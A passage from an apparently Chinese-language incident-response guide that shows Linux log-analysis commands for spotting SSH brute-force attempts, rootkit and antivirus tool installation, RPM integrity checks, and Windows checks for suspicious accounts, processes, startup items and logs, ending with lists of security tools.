src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1771.jpg" alt="图片"></p><p>日志分析技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h2 id="3、工具篇"><a href="#3、工具篇" class="headerlink" title="3、工具篇"></a>3、工具篇</h2><h3 id="3-1：Rootkit查杀"><a href="#3-1：Rootkit查杀" class="headerlink" title="3.1：Rootkit查杀"></a>3.1：Rootkit查杀</h3><p>chkrootkit</p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure><h3 id="3-2：病毒查杀"><a href="#3-2：病毒查杀" class="headerlink" title="3.2：病毒查杀"></a>3.2：病毒查杀</h3><p>Clamav</p><p>ClamAV的官方下载地址为：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p><p>安装方式一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组clamav和组成员clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure><h3 id="3-3：webshell查杀"><a href="#3-3：webshell查杀" class="headerlink" title="3.3：webshell查杀"></a>3.3：webshell查杀</h3><p>linux版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">河马webshell查杀：http://www.shellpub.com</span><br><span class="line">深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html</span><br></pre></td></tr></table></figure><h3 id="3-4：RPM-check检查"><a href="#3-4：RPM-check检查" class="headerlink" title="3.4：RPM check检查"></a>3.4：RPM check检查</h3><p>系统完整性可以通过<code>rpm</code>自带的<code>-Va</code>来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是<code>8</code>位长字符串，每个字符都用以表示文件与<code>RPM</code>数据库中一种属性的比较结果 ，如果是<code>.</code> (点) 则表示测试通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">S         文件大小是否改变</span><br><span class="line">M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">D         设备中，从代码是否改变</span><br><span class="line">L         文件路径是否改变</span><br><span class="line">U         文件的属主（所有者）是否改变</span><br><span class="line">G         文件的属组是否改变</span><br><span class="line">T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如何还原回来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下</span><br><span class="line">cp /root/bin/ls  /bin/ 把ls命令复制到/bin/目录 修复文件丢失</span><br></pre></td></tr></table></figure><h3 id="3-5：linux安全检查脚本"><a href="#3-5：linux安全检查脚本" class="headerlink" title="3.5：linux安全检查脚本"></a>3.5：linux安全检查脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Github项目地址：</span><br><span class="line"></span><br><span class="line">https://github.com/grayddq/GScan</span><br><span class="line"></span><br><span class="line">https://github.com/ppabc/security_check</span><br><span class="line"></span><br><span class="line">https://github.com/T0xst/linux</span><br></pre></td></tr></table></figure><h1 id="4、Windows入侵排查，木马处理"><a href="#4、Windows入侵排查，木马处理" class="headerlink" title="4、Windows入侵排查，木马处理"></a>4、Windows入侵排查，木马处理</h1><h2 id="1、入侵排查思路"><a href="#1、入侵排查思路" class="headerlink" title="1、入侵排查思路"></a>1、入侵排查思路</h2><h3 id="1-1：检查系统账号安全"><a href="#1-1：检查系统账号安全" class="headerlink" title="1.1：检查系统账号安全"></a>1.1：检查系统账号安全</h3><h4 id="（1）查看服务器是否有弱口令，远程管理端口是否对公网开放"><a href="#（1）查看服务器是否有弱口令，远程管理端口是否对公网开放" class="headerlink" title="（1）查看服务器是否有弱口令，远程管理端口是否对公网开放"></a>（1）查看服务器是否有弱口令，远程管理端口是否对公网开放</h4><p>检查方法：根据实际情况咨询相关服务器管理员。</p><h4 id="（2）查看服务器是否存在可疑账号、新增账号"><a href="#（2）查看服务器是否存在可疑账号、新增账号" class="headerlink" title="（2）查看服务器是否存在可疑账号、新增账号"></a>（2）查看服务器是否存在可疑账号、新增账号</h4><p>检查方法：打开<code>cmd</code>窗口，输入 <code>lusrmgr.msc</code> 命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1772.png" alt="图片"></p><p>查看是否有<code>新增/可疑</code>的账号，如有管理员群组的（Administrators）里的新增用户，请立即禁用或者删除掉。</p><h4 id="（3）查看服务器是否存在隐藏账号、克隆账号"><a href="#（3）查看服务器是否存在隐藏账号、克隆账号" class="headerlink" title="（3）查看服务器是否存在隐藏账号、克隆账号"></a>（3）查看服务器是否存在隐藏账号、克隆账号</h4><p>检查方法：打开<code>注册表</code>，查看管理员对应<code>键值</code>、使用<code>D盾_web查杀工具</code>，集成了对克隆账号检测的功能。</p><p>下载地址：<a href="http://www.d99net.net/News.asp?id=47">http://www.d99net.net/News.asp?id=47</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1773.jpg" alt="图片"></p><h4 id="（4）结合日志，查看管理员登陆时间、用户名是否存在异常"><a href="#（4）结合日志，查看管理员登陆时间、用户名是否存在异常" class="headerlink" title="（4）结合日志，查看管理员登陆时间、用户名是否存在异常"></a>（4）结合日志，查看管理员登陆时间、用户名是否存在异常</h4><p>检查方法：输入命令<code>eventvwr.msc</code>，打开事件查看器：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1774.jpg" alt="图片"></p><p>导出<code>Windows日志</code>-<code>安全</code>，利用<code>Log Parser</code>进行分析：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1775.jpg" alt="图片"></p><p><code>Log Parser</code>具体用法：<a href="https://www.cnblogs.com/pythonal/p/10127795.html">https://www.cnblogs.com/pythonal/p/10127795.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT_TOKEN(Strings,0,&#x27;|&#x27;) AS USERNAME,EXTRACT_TOKEN(Strings,2,&#x27;|&#x27;) AS SERVICE\_NAME,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) AS Client_IP FROM &#x27;C:\Users\Administrator\Desktop\1.evtx&#x27; WHERE EventID=4798&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1776.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT_TOKEN(Strings,0,&#x27;|&#x27;) AS USERNAME,EXTRACT_TOKEN(Strings,2,&#x27;|&#x27;) AS SERVICE\_NAME,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) AS Client_IP FROM &#x27;C:\Users\Administrator\Desktop\1.evtx&#x27; WHERE EventID=4624&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1777.jpg" alt="图片"></p><h3 id="1-2：检查异常端口进程"><a href="#1-2：检查异常端口进程" class="headerlink" title="1.2：检查异常端口进程"></a>1.2：检查异常端口进程</h3><h4 id="（1）检查端口连接情况，是否有远程连接、可疑连接"><a href="#（1）检查端口连接情况，是否有远程连接、可疑连接" class="headerlink" title="（1）检查端口连接情况，是否有远程连接、可疑连接"></a>（1）检查端口连接情况，是否有远程连接、可疑连接</h4><p>检查方法：</p><p>a：<code>netstat -ano</code>查看目前的网络连接，定位可疑的<code>ESTABLISHED</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1778.png" alt="图片"></p><p>b：根据<code>netstat</code>定位出的<code>pid</code>，在通过<code>tasklist</code>命令进行进程定位，<code>tasklist | findstr &quot;PID&quot;</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1779.png" alt="图片"></p><h4 id="（2）进程"><a href="#（2）进程" class="headerlink" title="（2）进程"></a>（2）进程</h4><p>a：<code>开始</code>-<code>运行</code>-输入<code>msinfo32</code>，依次点击<code>软件环境</code>-<code>正在运行任务</code>，就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等等。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1780.png" alt="图片"></p><p>b：打开<code>D盾_web查杀工具</code>，进程查看，关注没有签名信息的进程</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1781.png" alt="图片"></p><p>c：查看可疑的进程其子进程，可以通过观察下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">没有签名验证信息的进程</span><br><span class="line">没有描述信息的进程</span><br><span class="line">进程的属主</span><br><span class="line">进程的路径是否合法</span><br><span class="line">CPU或内存资源占用长时间过高的进程</span><br></pre></td></tr></table></figure><h4 id="（3）小技巧"><a href="#（3）小技巧" class="headerlink" title="（3）小技巧"></a>（3）小技巧</h4><p>a：查看端口对应的<code>PID</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;port&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1782.png" alt="图片"></p><p>b：查看进程对应的<code>PID</code>，<code>任务管理器</code>-<code>查看</code>-<code>选择列</code>-<code>PID</code>、或者<code>tasklist | findstr &quot;PID&quot;</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1783.png" alt="图片"></p><p>c：查看进程对应的程序位置：</p><p><code>任务管理器</code>-选择对应进程，右键<code>打开文件位置</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1784.png" alt="图片"></p><p>在运行输入<code>wmic</code>，<code>cmd</code>界面输入<code>process</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1785.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1786.png" alt="图片"></p><p>d：<code>tasklist /svc</code> （进程-PID-服务)</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1787.png" alt="图片"></p><h3 id="1-3：检查启动项、计划任务、服务"><a href="#1-3：检查启动项、计划任务、服务" class="headerlink" title="1.3：检查启动项、计划任务、服务"></a>1.3：检查启动项、计划任务、服务</h3><h4 id="（1）检查服务器是否有异常的启动项"><a href="#（1）检查服务器是否有异常的启动项" class="headerlink" title="（1）检查服务器是否有异常的启动项"></a>（1）检查服务器是否有异常的启动项</h4><p>检查方法：</p><p>a：登陆服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1788.png" alt="图片"></p><p>b：单击【开始菜单】 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1789.png" alt="图片"></p><p>c：单击【开始】&gt;【运行】，输入 <code>regedit</code>，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1790.png" alt="图片"></p><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d：利用安全软件查看启动项、开机时间管理等。</p><p>e：组策略，运行<code>gpedit.msc</code>。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1791.png" alt="图片"></p><h4 id="（2）检查计划任务"><a href="#（2）检查计划任务" class="headerlink" title="（2）检查计划任务"></a>（2）检查计划任务</h4><p>检查方法：</p><p>a：单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1792.png" alt="图片"></p><p>b：单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入<code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1793.png" alt="图片"></p><h4 id="（3）服务自启动"><a href="#（3）服务自启动" class="headerlink" title="（3）服务自启动"></a>（3）服务自启动</h4><p>检查方法：单击【开始】&gt;【运行】，输入<code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1794.png" alt="图片"></p><h3 id="1-4：检查系统相关信息"><a href="#1-4：检查系统相关信息" class="headerlink" title="1.4：检查系统相关信息"></a>1.4：检查系统相关信息</h3><h4 id="（1）查看系统版本以及补丁信息"><a href="#（1）查看系统版本以及补丁信息" class="headerlink" title="（1）查看系统版本以及补丁信息"></a>（1）查看系统版本以及补丁信息</h4><p>检查方法：单击【开始】&gt;【运行】，输入<code>systeminfo</code>，查看系统信息</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1795.png" alt="图片"></p><h4 id="（2）查找可疑目录及文件"><a href="#（2）查找可疑目录及文件" class="headerlink" title="（2）查找可疑目录及文件"></a>（2）查找可疑目录及文件</h4><p>检查方法：</p><p>a：查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Window 2003  C:\Documents and Settings</span><br><span class="line">Window 2008R2  C:\Users\</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1796.png" alt="图片"></p><p>b：单击【开始】&gt;【运行】，输入<code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1797.png" alt="图片"></p><p>c：在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d：回收站、浏览器下载目录、浏览器历史记录</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1798.png" alt="图片"></p><p>e：修改时间在创建时间之前的为可疑文件</p><h4 id="（3）得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？"><a href="#（3）得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？" class="headerlink" title="（3）得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？"></a>（3）得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</h4><p>a：利用 <code>Registry Workshop</code> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p><p>b：利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h3 id="1-5：自动化查杀"><a href="#1-5：自动化查杀" class="headerlink" title="1.5：自动化查杀"></a>1.5：自动化查杀</h3><p>病毒查杀：检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</p><p>webshell查杀：检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。</p><h3 id="1-6：日志分析"><a href="#1-6：日志分析" class="headerlink" title="1.6：日志分析"></a>1.6：日志分析</h3><p>系统日志分析方法：</p><p>a：前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b：<code>Win+R</code>打开运行，输入【<code>eventvwr.msc</code>】，回车运行，打开<code>事件查看器</code>。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1799.png" alt="图片"></p><p>c：导出应用程序日志、安全日志、系统日志，利用<code>Log Parser</code>进行分析。</p><h4 id="WEB访问日志分析方法："><a href="#WEB访问日志分析方法：" class="headerlink" title="WEB访问日志分析方法："></a>WEB访问日志分析方法：</h4><p>a：找到中间件的web日志，打包到本地方便进行分析。</p><p>b：推荐工具：<code>Window</code>下，推荐用 <code>EmEditor</code> 进行日志分析，支持大文本，搜索效率还不错。<code>Linux</code>下，使用<code>Shell</code>命令组合查询分析</p><h2 id="2、工具篇"><a href="#2、工具篇" class="headerlink" title="2、工具篇"></a>2、工具篇</h2><h3 id="2-1：病毒分析"><a href="#2-1：病毒分析" class="headerlink" title="2.1：病毒分析"></a>2.1：病毒分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PCHunter：http://www.xuetr.com</span><br><span class="line"></span><br><span class="line">火绒剑：https://www.huorong.cn</span><br><span class="line"></span><br><span class="line">Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</span><br><span class="line"></span><br><span class="line">processhacker：https://processhacker.sourceforge.io/downloads.php</span><br><span class="line"></span><br><span class="line">autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</span><br><span class="line"></span><br><span class="line">OTL：https://www.bleepingcomputer.com/download/otl/</span><br><span class="line"></span><br><span class="line">SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector</span><br></pre></td></tr></table></figure><h3 id="2-2：病毒查杀"><a href="#2-2：病毒查杀" class="headerlink" title="2.2：病毒查杀"></a>2.2：病毒查杀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe   （推荐理由：绿色版、最新病毒库）</span><br><span class="line"></span><br><span class="line">大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</span><br><span class="line"></span><br><span class="line">火绒安全软件：https://www.huorong.cn</span><br><span class="line"></span><br><span class="line">360杀毒：http://sd.360.cn/download_center.html</span><br></pre></td></tr></table></figure><h3 id="2-3：病毒动态"><a href="#2-3：病毒动态" class="headerlink" title="2.3：病毒动态"></a>2.3：病毒动态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn</span><br><span class="line"></span><br><span class="line">微步在线威胁情报社区：https://x.threatbook.cn</span><br><span class="line"></span><br><span class="line">火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html</span><br><span class="line"></span><br><span class="line">爱毒霸社区：http://bbs.duba.net</span><br><span class="line"></span><br><span class="line">腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html</span><br></pre></td></tr></table></figure><h3 id="2-4：在线病毒扫描网站"><a href="#2-4：在线病毒扫描网站" class="headerlink" 